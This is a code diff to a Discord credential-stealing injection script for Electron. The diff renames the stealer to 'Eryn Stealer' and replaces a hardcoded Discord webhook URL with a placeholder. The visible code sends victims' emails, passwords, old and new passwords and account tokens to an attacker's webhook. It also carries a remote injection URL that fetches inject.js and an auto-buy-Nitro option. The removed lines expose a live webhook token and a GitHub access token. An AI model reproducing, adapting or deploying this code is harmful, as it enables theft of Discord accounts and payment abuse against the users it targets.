@@ -6,12 +6,12 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: 'https://discord.com/api/webhooks/990055113622171749/qAazNA9iR_QD11Xj9OSlcOzm7k1ydgfTxSGcxSu0Qhiz7Es8lM58qLdaHlnKiNKlxuAy',
+  webhook: '%WEBHOOK_LINK%',
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: true, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'moonsz#0054', 
+  embed_name: 'Eryn Stealer', 
   embed_icon: ''.replace(/ /g, '%20'), 
   embed_color: 3447704, 
   injection_url: 'https://raw.githubusercontent.com/Emny6/apiinjectionlblalbla/main/inject.js?token=GHSAT0AAAAAABVNWNLL7OC5MLTRKNYVVB3QYVWGCIQ', 
@@ -700,7 +700,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'moonsz#0054',
+          text: 'Eryn Stealer',
         },
       },
     ],
@@ -760,7 +760,7 @@ const passwordChanged = async (oldpassword, newpassword, token, email) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'moonsz#0054',
+            text: 'Eryn Stealer',
           },
         },
       ],
@@ -814,7 +814,7 @@ const passwordChanged = async (oldpassword, newpassword, token, email) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'moonsz#0054',
+            text: 'Eryn Stealer',
           },
         },
       ],
@@ -861,7 +861,7 @@ const passwordChanged = async (oldpassword, newpassword, token, email) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'moonsz#0054',
+            text: 'Eryn Stealer',
           },
         },
       ],
@@ -918,7 +918,7 @@ const passwordChanged = async (oldpassword, newpassword, token, email) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'moonsz#0054',
+            text: 'Eryn Stealer',
           },
         },
       ],
@@ -959,7 +959,7 @@ const passwordChanged = async (oldpassword, newpassword, token, email) => {
             {
               name: 'Token',
               value: `\`\`\`${token}\`\`\``,
-              inline: false,
+              inline: true,
             },
           ],
           author: {
@@ -967,7 +967,7 @@ const passwordChanged = async (oldpassword, newpassword, token, email) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'moonsz#0054',
+            text: 'Eryn Stealer',
           },
         },
       ],
